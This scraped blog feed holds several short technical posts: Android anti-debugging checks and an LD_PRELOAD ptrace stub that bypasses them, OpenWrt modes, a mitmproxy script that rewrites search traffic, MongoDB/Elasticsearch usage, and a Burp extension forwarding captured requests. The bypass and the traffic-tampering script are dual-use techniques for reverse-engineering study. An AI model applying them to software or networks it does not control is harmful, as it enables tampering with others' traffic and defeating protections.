<p>Create the following file:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">ptrace</span><span class="params">(<span class="type">int</span> request, <span class="type">int</span> pid, <span class="type">void</span> *addr, <span class="type">void</span> *data)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Compile it as a shared library:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC ptrace.c -o ptrace.so</span><br></pre></td></tr></table></figure>
<p>Set the LD_PRELOAD environment variable:<br>In the shell:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export LD_PRELOAD=./ptrace.so</span><br></pre></td></tr></table></figure>
<p>In gdb:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set environment LD_PRELOAD=./ptrace.so</span><br></pre></td></tr></table></figure>
<p>The output will be like this:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) file a.out</span><br><span class="line">Reading symbols from a.out...(no debugging symbols found)...done.</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /tmp/a.out</span><br><span class="line">Don&#x27;t trace me!</span><br><span class="line">[Inferior 1 (process 30567) exited with code 01]</span><br><span class="line">(gdb) set environment LD_PRELOAD=./ptrace.so</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /tmp/a.out</span><br><span class="line">Number: 0</span><br><span class="line">Number: 1</span><br><span class="line">Number: 2</span><br><span class="line">Number: 3</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h2 id="Monitoring-TracerPid"><a href="#Monitoring-TracerPid" class="headerlink" title="Monitoring TracerPid"></a>Monitoring TracerPid</h2><p>TracerPid is a value which can reflect the status of the process at runtime. If the process is being attached to a debugger, the value of TracerPid won’t be 0 or the PID of the target process. Instead, the TracerPid indicates the PID of the debugger process.</p>
<p>We have the following code:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">f</span> <span class="params">(<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span> (<span class="string">&quot;Number: %d\n&quot;</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        f (i++);</span><br><span class="line">        sleep (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Execute the program and let’s take a look at the process status:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /proc/31589/status</span></span><br><span class="line">Name:	a.out</span><br><span class="line">Umask:	0022</span><br><span class="line">State:	S (sleeping)</span><br><span class="line">Tgid:	31598</span><br><span class="line">Ngid:	0</span><br><span class="line">Pid:	31598</span><br><span class="line">PPid:	30967</span><br><span class="line">TracerPid:	0</span><br><span class="line">Uid:	1000	1000	1000	1000</span><br><span class="line">Gid:	1000	1000	1000	1000</span><br><span class="line">FDSize:	256</span><br><span class="line">Groups:	4 20 24 27 29 44 46 60 100 105 109 995 997 998 999 1000</span><br><span class="line">NStgid:	31598</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>We can find that the TracerPid is 0 which means the program itself is not being debugged.</p>
<p>Debug the program with gdb:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) file ./a.out</span><br><span class="line">Reading symbols from ./a.out...(no debugging symbols found)...done.</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /tmp/a.out</span><br><span class="line">Number: 0</span><br><span class="line">Number: 1</span><br><span class="line">Number: 2</span><br><span class="line">Number: 3</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>Check the TracerPid:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /proc/31652/status</span></span><br><span class="line">Name:   a.out</span><br><span class="line">Umask:  0022</span><br><span class="line">State:  S (sleeping)</span><br><span class="line">Tgid:   31652</span><br><span class="line">Ngid:   0</span><br><span class="line">Pid:    31652</span><br><span class="line">PPid:   31649</span><br><span class="line">TracerPid:      31649</span><br><span class="line">Uid:    1000    1000    1000    1000</span><br><span class="line">Gid:    1000    1000    1000    1000</span><br><span class="line">FDSize: 32</span><br><span class="line">Groups: 4 20 24 27 29 44 46 60 100 105 109 995 997 998 999 1000 </span><br><span class="line">NStgid: 31652</span><br><span class="line">NSpid:  31652</span><br><span class="line">NSpgid: 31652</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>Then let’s trace the PID to which the TracerPid indicates:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ps aux | grep 31649</span></span><br><span class="line">root       31649  1.3  0.8  42720 33484 pts/2    S    17:51   0:00 gdb</span><br></pre></td></tr></table></figure>

<h2 id="Detecting-the-Ports-of-Debuggers"><a href="#Detecting-the-Ports-of-Debuggers" class="headerlink" title="Detecting the Ports of Debuggers"></a>Detecting the Ports of Debuggers</h2><h2 id="Detecting-the-Names-of-Debuggers"><a href="#Detecting-the-Names-of-Debuggers" class="headerlink" title="Detecting the Names of Debuggers"></a>Detecting the Names of Debuggers</h2><p>Debuggers like <em>android_server</em>, <em>gdb</em>, <em>gdbserver</em> can be retrieved by enumerating the processes or checking the installation directories. For example:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /proc/33555/cmdline</span></span><br><span class="line">./android_server</span><br></pre></td></tr></table></figure>
<p>The output shows that the IDA remote debugger is running. And we can also check the debugger installation directories such as <em>/data/local/tmp</em> which stores the IDA <em>android_server</em> binary.</p>
<h2 id="Detecting-the-Debugging-Breakpoints"><a href="#Detecting-the-Debugging-Breakpoints" class="headerlink" title="Detecting the Debugging Breakpoints"></a>Detecting the Debugging Breakpoints</h2><p>Detecting the software breakpoints is a common anti-debugging approach which can be implemented by looping through the execution segments to detect the software breakpoint instructions.</p>
<p>The breakpoint instructions of the related instruction sets:</p>
<table>
<thead>
<tr>
<th align="center">Instruction Set</th>
<th align="center">Instruction</th>
</tr>
</thead>
<tbody><tr>
<td align="center">arm_linux_arm_le</td>
<td align="center">{ 0x01, 0x00, 0x9f, 0xef }</td>
</tr>
<tr>
<td align="center">arm_linux_arm_be</td>
<td align="center">{ 0xef, 0x9f, 0x00, 0x01 }</td>
</tr>
<tr>
<td align="center">eabi_linux_arm_le</td>
<td align="center">{ 0xf0, 0x01, 0xf0, 0xe7 }</td>
</tr>
<tr>
<td align="center">eabi_linux_arm_be</td>
<td align="center">{ 0xe7, 0xf0, 0x01, 0xf0 }</td>
</tr>
<tr>
<td align="center">arm_linux_thumb_le</td>
<td align="center">{ 0x01, 0xde }</td>
</tr>
<tr>
<td align="center">arm_linux_thumb_be</td>
<td align="center">{ 0xde, 0x01 }</td>
</tr>
<tr>
<td align="center">arm_linux_thumb2_le</td>
<td align="center">{ 0xf0, 0xf7, 0x00, 0xa0 }</td>
</tr>
<tr>
<td align="center">arm_linux_thumb2_be</td>
<td align="center">{ 0xf7, 0xf0, 0xa0, 0x00 }</td>
</tr>
</tbody></table>
<h2 id="Inotify-Detection"><a href="#Inotify-Detection" class="headerlink" title="Inotify Detection"></a>Inotify Detection</h2><p>Under Linux, inotify can monitor file system events (open, read, delete, delete, etc.). The hardening scheme can monitor some files of apk itself through inotify. Some memory dump technologies pass /proc/pid/maps, /proc/pid/mem to achieve memory dump, so monitoring the reading and writing of these files can also play a certain anti-debugging effect.</p>
<h2 id="Detecting-the-Time-Interval-or-Latency-of-Code-Execution"><a href="#Detecting-the-Time-Interval-or-Latency-of-Code-Execution" class="headerlink" title="Detecting the Time Interval or Latency of Code Execution"></a>Detecting the Time Interval or Latency of Code Execution</h2><p>By calculating the execution time difference of a certain part of the code to determine whether it is debugged, under the Linux kernel, the current time can be obtained by time, gettimeofday, or directly by sys call. In addition, you can also determine whether the program runs timeout by customizing the SIGALRM signal.</p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://android.googlesource.com/toolchain/gdb/+/refs/heads/master/gdb-9.2/gdb/arm-linux-tdep.c">https://android.googlesource.com/toolchain/gdb/+/refs/heads/master/gdb-9.2/gdb/arm-linux-tdep.c</a></p>
<p><a href="https://www.programmersought.com/article/1472621633/">https://www.programmersought.com/article/1472621633/</a></p>
]]></content>
      <categories>
        <category>Reverse Engineering</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>anti-debugging</tag>
      </tags>
  </entry>
  <entry>
    <title>Bridge and Router Working Mode on OpenWrt</title>
    <url>/2020/11/13/Bridge-and-Router-Working-Mode-on-OpenWrt/</url>
    <content><![CDATA[<h2 id="Bridge-mode"><a href="#Bridge-mode" class="headerlink" title="Bridge mode"></a>Bridge mode</h2><p>Bridge mode allows your OpenWrt device connects to the LAN network as a bridged AP. </p>
<img src="/2020/11/13/Bridge-and-Router-Working-Mode-on-OpenWrt/pic_1.png" width="60%" height="60%">

<p>You can use this device to extend your current router or even just plays the role of a gateway which handles all the traffic flows through your local network. More details can be found in this OpenWrt official page: <a href="https://openwrt.org/docs/guide-user/network/wifi/bridgedap">https://openwrt.org/docs/guide-user/network/wifi/bridgedap</a></p>
<h2 id="Router-mode"><a href="#Router-mode" class="headerlink" title="Router mode"></a>Router mode</h2><p>The router mode will be easier to understand. It’s more of a new router device added into the current local network. This router has it’s own LAN and WAN interface. And it’s LAN interface works on a different layer which controls by the NAT rules.</p>
<img src="/2020/11/13/Bridge-and-Router-Working-Mode-on-OpenWrt/pic_2.png" width="60%" height="60%">

<p>You can also go to the OpenWrt official page to see how it works: <a href="https://openwrt.org/docs/guide-user/network/routedclient">https://openwrt.org/docs/guide-user/network/routedclient</a></p>
<h2 id="Compile-your-own-packages"><a href="#Compile-your-own-packages" class="headerlink" title="Compile your own packages"></a>Compile your own packages</h2><p>In case of there are some packages are not compatible with your kernel or it doesn’t exist in your package list. You have to compile them from the source by yourself.</p>
<p>clone the whole project and follow the compile tutorial to config properly. You can edit your configuration conveniently through menuconfig. Assume that I need to build the drivers for my network adapter, I should choose the compatible driver in the list.</p>
<p>pic</p>
]]></content>
      <categories>
        <category>IoT</category>
      </categories>
      <tags>
        <tag>OpenWrt</tag>
      </tags>
  </entry>
  <entry>
    <title>Brief Hijack Framework of Mitmproxy</title>
    <url>/2019/11/16/Brief-Hijack-Framework-of-Mitmproxy/</url>
    <content><![CDATA[<h2 id="How-Will-This-Framework-Work"><a href="#How-Will-This-Framework-Work" class="headerlink" title="How Will This Framework Work"></a>How Will This Framework Work</h2><ul>
<li>If you query information using <a href="http://www.baidu.com/">www.baidu.com</a>, it will response with code 404, and it will suggest you to use <a href="http://www.bing.com/">www.bing.com</a> to search whatever you want.</li>
<li>When you open <a href="http://www.bing.com/">www.bing.com</a> and enter what you want to search, you will find that no matter what you have entered, the response result wiil always be yandex.</li>
<li>Again, you click the link and open yandex to query information, it seems that everything is working properly this time.</li>
<li>Wait a moment, you can find that the search button has been replaced with “Try Google”.</li>
</ul>
<h2 id="Scripting"><a href="#Scripting" class="headerlink" title="Scripting"></a>Scripting</h2><p>Here gives all the code:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> mitmproxy.http</span><br><span class="line"><span class="keyword">from</span> mitmproxy <span class="keyword">import</span> ctx, http</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Tamper</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">request</span>(<span class="params">self, flow: mitmproxy.http.HTTPFlow</span>):</span><br><span class="line">        <span class="keyword">if</span> flow.request.host == <span class="string">&quot;www.baidu.com&quot;</span>:</span><br><span class="line">            flow.response = http.HTTPResponse.make(</span><br><span class="line">                <span class="number">404</span>, </span><br><span class="line">                <span class="string">b&quot;Don&#x27;t use baidu to query anything please, try bing.com. :)&quot;</span>, </span><br><span class="line">                &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/html&quot;</span>&#125;</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> flow.request.host != <span class="string">&quot;cn.bing.com&quot;</span> <span class="keyword">or</span> <span class="keyword">not</span> flow.request.path.startswith(<span class="string">&quot;/search?&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;q&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> flow.request.query.keys():</span><br><span class="line">            ctx.log.warn(<span class="string">&quot;can not get search word from %s&quot;</span> % flow.request.pretty_url)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        ctx.log.info(<span class="string">&quot;catch search word: %s&quot;</span> % flow.request.query.get(<span class="string">&quot;q&quot;</span>))</span><br><span class="line">        flow.request.query.set_all(<span class="string">&quot;q&quot;</span>, [<span class="string">&quot;Yandex&quot;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">response</span>(<span class="params">self, flow: mitmproxy.http.HTTPFlow</span>):</span><br><span class="line">        <span class="keyword">if</span> flow.request.host != <span class="string">&quot;yandex.com&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        text = flow.response.get_text()</span><br><span class="line">        text = text.replace(<span class="string">&quot;Search&quot;</span>, <span class="string">&quot;Try Google :)&quot;</span>)</span><br><span class="line">        flow.response.set_text(text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Counter</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">request</span>(<span class="params">self, flow: mitmproxy.http.HTTPFlow</span>):</span><br><span class="line">        self.num = self.num + <span class="number">1</span></span><br><span class="line">        ctx.log.info(<span class="string">&quot;We&#x27;ve seen %d flows&quot;</span> % self.num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addons = [</span><br><span class="line">    Tamper(),</span><br><span class="line">    Counter()</span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Start up the proxy server to load the script, there are basically three ways to run the proxy:</p>
<ul>
<li>Only run the server on the backend.<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mitmdump --listen-port 9090 -s tamper.py</span><br></pre></td></tr></table></figure></li>
<li>Run the server with a terminal-based GUI.<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mitmproxy --listen-port 9090 -s tamper.py</span><br></pre></td></tr></table></figure></li>
<li>Run the server with a web-based GUI.<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mitmweb --web-port 9091 --listen-port 9090 -s tamper.py</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Install-The-Certificate"><a href="#Install-The-Certificate" class="headerlink" title="Install The Certificate"></a>Install The Certificate</h2><p>You will get the wrong-certificate error if you directly access the HTTPS sites through proxy server. For Chrome, you can type “thisisunsafe” to bypass it or install and trust the certificate to access the proxy server permanently.<br>Access the proxy server with certificate:</p>
<ul>
<li>curl on the command line:<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl --proxy 127.0.0.1:9090 --cacert ~/.mitmproxy/mitmproxy-ca-cert.pem https://example.com/</span><br></pre></td></tr></table></figure></li>
<li>wget on the command line:<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget -e https_proxy=127.0.0.1:9090 --ca-certificate ~/.mitmproxy/mitmproxy-ca-cert.pem https://example.com/</span><br></pre></td></tr></table></figure>
Or execute the ~/.mitmproxy/mitmproxy-ca-cert.pem file to install the certificate.</li>
</ul>
<h2 id="Verification"><a href="#Verification" class="headerlink" title="Verification"></a>Verification</h2><p>After all done, you can check the proxy result to verify it’s working properly.</p>
<img src="/2019/11/16/Brief-Hijack-Framework-of-Mitmproxy/pic_1.png" width="60%" height="60%">

]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>MITM</tag>
        <tag>mitmproxy</tag>
      </tags>
  </entry>
  <entry>
    <title>Brief Usage of MongoDB and Elasticsearch</title>
    <url>/2018/07/03/Brief-Usage-of-MongoDB-and-Elasticsearch/</url>
    <content><![CDATA[<h2 id="Store-Data-in-MongoDB"><a href="#Store-Data-in-MongoDB" class="headerlink" title="Store Data in MongoDB"></a>Store Data in MongoDB</h2><p>To store data in MongoDB database, I use the python module pymongo as shown below:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pymongo</span><br><span class="line"></span><br><span class="line">client = pymongo.MongoClient(<span class="string">&quot;mongodb://%s:%s@127.0.0.1&quot;</span> % (<span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;password&#x27;</span>), port=<span class="number">22222</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mongodbexec</span>(<span class="params">name, contact, groupnumber, groupname, timeStamp, card, nick</span>):</span><br><span class="line">    member = &#123;</span><br><span class="line">        <span class="string">&#x27;groupcard&#x27;</span>: card,</span><br><span class="line">        <span class="string">&#x27;groupnumber&#x27;</span>: groupnumber,</span><br><span class="line">        <span class="string">&#x27;groupname&#x27;</span>: groupname,</span><br><span class="line">        <span class="string">&#x27;contact&#x27;</span>: contact,</span><br><span class="line">        <span class="string">&#x27;nickname&#x27;</span>: nick,</span><br><span class="line">        <span class="string">&#x27;qqage&#x27;</span>: memberindex[name][<span class="number">1</span>],</span><br><span class="line">        <span class="string">&#x27;qq&#x27;</span>: memberindex[name][<span class="number">2</span>],</span><br><span class="line">        <span class="string">&#x27;timestamp&#x27;</span>: timeStamp,</span><br><span class="line">    &#125;</span><br><span class="line">    QQres.insert_one(member)</span><br></pre></td></tr></table></figure>

<p>And for security, adding an auth process is necessary. In mongo console:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use admin //switch to admin database</span><br><span class="line">db.createUser(&#123;user:&#x27;root&#x27;, pwd: &#x27;password&#x27;, roles: [&#x27;root&#x27;]&#125;) //create an administrator</span><br></pre></td></tr></table></figure>

<p>If you want to change your user’s password later, you can use the changeUserPassword command:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">db.changeUserPassword(&#x27;root&#x27;,&#x27;password1&#x27;)</span><br></pre></td></tr></table></figure>

<p>Then you should start mongod with argument ‘–auth’:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mongod --port 27017 --dbpath /data/db1 --auth</span><br></pre></td></tr></table></figure>

<p>If you want to login into mongo console, you must provide your username and password like this:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mongo admin -u root -p password</span><br></pre></td></tr></table></figure>

<p>Export data to csv(<a href="https://docs.mongodb.com/manual/reference/program/mongoexport/">https://docs.mongodb.com/manual/reference/program/mongoexport/</a>):</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mongoexport --username xxx --password xxx --authenticationDatabase admin --db xxx --collection xxx --type csv --fields xxx,xxx --out .../output.csv</span><br></pre></td></tr></table></figure>

<h2 id="Export-MongoDB-Database-Into-Elasticsearch"><a href="#Export-MongoDB-Database-Into-Elasticsearch" class="headerlink" title="Export MongoDB Database Into Elasticsearch"></a>Export MongoDB Database Into Elasticsearch</h2><p>There are some useful tools to finish this job such as mongo-connector, transporter, etc. But I met some problems when I use mongo-connector and I speculate it’s the incompatibility of versions between mongo-connector and Elasticsearch. So I chose transporter which is an open source and high-efficiency tool built with go.</p>
<p>It’s easy to build and configure. More details: <a href="https://github.com/compose/transporter">https://github.com/compose/transporter</a>.</p>
<p>When building finished, the first thing is to initialize the transporter:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">transporter init mongodb elasticsearch</span><br></pre></td></tr></table></figure>

<p>This step will generate a file pipeline.js under the directory of cmd/transporter, open and modify the file:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> source = <span class="title function_">mongodb</span>(&#123;</span><br><span class="line">  <span class="string">&quot;uri&quot;</span>: <span class="string">&quot;mongodb://127.0.0.1:22222/database&quot;</span></span><br><span class="line">  <span class="comment">// &quot;timeout&quot;: &quot;30s&quot;,</span></span><br><span class="line">  <span class="comment">// &quot;tail&quot;: false,</span></span><br><span class="line">  <span class="comment">// &quot;ssl&quot;: false,</span></span><br><span class="line">  <span class="comment">// &quot;cacerts&quot;: [&quot;/path/to/cert.pem&quot;],</span></span><br><span class="line">  <span class="comment">// &quot;wc&quot;: 1,</span></span><br><span class="line">  <span class="comment">// &quot;fsync&quot;: false,</span></span><br><span class="line">  <span class="comment">// &quot;bulk&quot;: false,</span></span><br><span class="line">  <span class="comment">// &quot;collection_filters&quot;: &quot;&#123;&#125;&quot;,</span></span><br><span class="line">  <span class="comment">// &quot;read_preference&quot;: &quot;Primary&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sink = <span class="title function_">elasticsearch</span>(&#123;</span><br><span class="line">  <span class="string">&quot;uri&quot;</span>: <span class="string">&quot;http://elastic:password@localhost:9200/database&quot;</span></span><br><span class="line">  <span class="comment">// &quot;timeout&quot;: &quot;10s&quot;, // defaults to 30s</span></span><br><span class="line">  <span class="comment">// &quot;aws_access_key&quot;: &quot;ABCDEF&quot;, // used for signing requests to AWS Elasticsearch service</span></span><br><span class="line">  <span class="comment">// &quot;aws_access_secret&quot;: &quot;ABCDEF&quot; // used for signing requests to AWS Elasticsearch service</span></span><br><span class="line">  <span class="comment">// &quot;parent_id&quot;: &quot;elastic_parent&quot; // defaults to &quot;elastic_parent&quot; parent identifier for Elasticsearch</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">t.<span class="title class_">Source</span>(<span class="string">&quot;source&quot;</span>, source, <span class="string">&quot;/.*/&quot;</span>).<span class="title class_">Save</span>(<span class="string">&quot;sink&quot;</span>, sink, <span class="string">&quot;/.*/&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>Finally run the transporter to transfer the database from MongoDB to Elasticsearch.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">transporter run</span><br></pre></td></tr></table></figure>



<h2 id="Retrieve-Keywords-With-Elasticsearch"><a href="#Retrieve-Keywords-With-Elasticsearch" class="headerlink" title="Retrieve Keywords With Elasticsearch"></a>Retrieve Keywords With Elasticsearch</h2><p>Reading the docs to learn about the usage of Elasticsearch: <a href="https://www.elastic.co/guide/index.html">https://www.elastic.co/guide/index.html</a>.</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Mongodb</tag>
        <tag>Elasticsearch</tag>
      </tags>
  </entry>
  <entry>
    <title>BurpSuite Jython Extension for Passive Scanner</title>
    <url>/2018/05/08/BurpSuite-Jython-extension-for-passive-scanner/</url>
    <content><![CDATA[<h2 id="BurpSuite-Jython-Extension"><a href="#BurpSuite-Jython-Extension" class="headerlink" title="BurpSuite Jython Extension"></a>BurpSuite Jython Extension</h2><p>In order to glean the vulnerability detection information and avoid scanning the massive useless URLs of the websites, I prefer using passive scanner during my daily work.</p>
<p>I’d like to use BurpSuite to analyze URLs and store them in the database for the next passive scanning process via socket tunnel. But here comes the problem, BurpSuite cannot transfer https flow to another place, so I wrote a simple Jython script as the disposal.</p>
<p>Tutorial about writing a Jython extension can be found everywhere. Here I put the main code </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">processHttpMessage</span>(<span class="params">self, toolFlag, messageIsRequest, messageInfo</span>):</span><br><span class="line">    </span><br><span class="line">        <span class="comment"># only process requests</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> messageIsRequest:</span><br><span class="line">        </span><br><span class="line">            <span class="comment"># create a new log entry with the message details</span></span><br><span class="line">            self._lock.acquire()</span><br><span class="line">            row = self._log.size()</span><br><span class="line">            req = self._helpers.analyzeRequest(messageInfo)</span><br><span class="line">            LE = LogEntry(toolFlag, self._callbacks.saveBuffersToTempFiles(messageInfo), req.getUrl())</span><br><span class="line">            self._log.add(LE)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                params = req.getParameters()</span><br><span class="line">                pas = []</span><br><span class="line">                pnames = []</span><br><span class="line">                <span class="keyword">for</span> pa <span class="keyword">in</span> params:</span><br><span class="line">                    pnames.append(pa.getName())</span><br><span class="line">                    pas.append(pa.getName()+<span class="string">&quot;=&quot;</span>+pa.getValue())</span><br><span class="line">                <span class="comment">#pas = pas.join(&#x27;&amp;&#x27;)</span></span><br><span class="line">                </span><br><span class="line">                values = &#123;<span class="string">&quot;docs&quot;</span>:[&#123;<span class="string">&quot;TIME&quot;</span>:time.time(),<span class="string">&quot;URL&quot;</span>:LE._url.toString(),<span class="string">&quot;PNames&quot;</span>:<span class="string">&#x27;&amp;&#x27;</span>.join(pnames),<span class="string">&quot;Method&quot;</span>:req.getMethod(),<span class="string">&quot;HOST&quot;</span>:LE._url.getHost(),<span class="string">&quot;PATH&quot;</span>:LE._url.getPath(),<span class="string">&quot;PARAM&quot;</span>:<span class="string">&#x27;&amp;&#x27;</span>.join(pas),<span class="string">&quot;REQ&quot;</span>:LE._requestResponse.getRequest().tostring(),<span class="string">&quot;RESP&quot;</span>:LE._requestResponse.getResponse().tostring(),<span class="string">&quot;USER&quot;</span>:<span class="string">&quot;test&quot;</span>&#125;]&#125;</span><br><span class="line">                </span><br><span class="line">                <span class="comment">#data = &#x27;docs=[&#123;&quot;URL&quot;:&quot;&#x27;+LE._url.toString()+&#x27;&quot;,&quot;REQ&quot;:&quot;&#x27;+urllib.quote(LE._requestResponse.getRequest().tostring())+&#x27;&quot;,&quot;RESP&quot;:&quot;&#x27;+urllib.quote(LE._requestResponse.getResponse().tostring())+&#x27;&quot;&#125;]&#x27;</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment"># data = &quot;docs=&quot;+urllib.quote(json.dumps(values[&#x27;docs&#x27;], sort_keys=True))</span></span><br><span class="line">                send_data = &#123;&#125;</span><br><span class="line">                req_url = LE._url.toString()</span><br><span class="line">                req_headers, req_body = split_req(LE._requestResponse.getRequest().tostring())</span><br><span class="line">                o = urlparse(req_url)</span><br><span class="line">                req_host = o.netloc</span><br><span class="line">                req_headers[<span class="string">&#x27;Host&#x27;</span>] = req_host</span><br><span class="line">                req_method = req.getMethod()</span><br><span class="line">                data = extract_request(req_url, req_headers, req_method, req_body)</span><br><span class="line">                send_data[<span class="string">&#x27;req_url&#x27;</span>] = req_url</span><br><span class="line">                send_data[<span class="string">&#x27;req_headers&#x27;</span>], send_data[<span class="string">&#x27;req_body&#x27;</span>] = req_headers, req_body</span><br><span class="line">                send_data[<span class="string">&#x27;req_host&#x27;</span>] = req_host</span><br><span class="line">                send_data[<span class="string">&#x27;req_method&#x27;</span>] = req_method</span><br><span class="line">                send_data[<span class="string">&#x27;data&#x27;</span>] = data</span><br><span class="line">                <span class="built_in">print</span>(send_data)</span><br><span class="line"></span><br><span class="line">                target_url = <span class="string">&quot;http://192.168.10.57:8888&quot;</span></span><br><span class="line">                res = urllib2.Request(target_url, <span class="built_in">str</span>(send_data))</span><br><span class="line">                threading.Thread(target=urllib2.urlopen, args=(res,)).start()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            self.fireTableRowsInserted(row, row)</span><br><span class="line">            self._lock.release()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_request</span>(<span class="params">url, headers, method, body</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a = re.search(<span class="string">&#x27;://.*?/(.*)&#x27;</span>, url)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    url = (<span class="string">&#x27;/&#x27;</span> + a.group(<span class="number">1</span>)) <span class="keyword">if</span> a <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">&#x27;/&#x27;</span></span><br><span class="line">    requests = <span class="string">&quot;%s %s\r\n&quot;</span> % (method, url)</span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> headers.items():</span><br><span class="line">        requests += <span class="string">&quot;%s: %s\r\n&quot;</span> % (key, value)</span><br><span class="line">    requests += <span class="string">&quot;\r\n%s&quot;</span> % body</span><br><span class="line">    <span class="keyword">return</span> requests </span><br></pre></td></tr></table></figure>

<p>the function extract_request(url, headers, method, body) is used to transform requests and the processHttpMessage(self, toolFlag, messageIsRequest, messageInfo) function is used to send the BurpSuite URLs to another server which is started locally. Sure, there’s no need to do such complicated work, but I can’t find some modules(redis) I need in Jython, maybe you have better ideas I don’t know…Start a server</p>
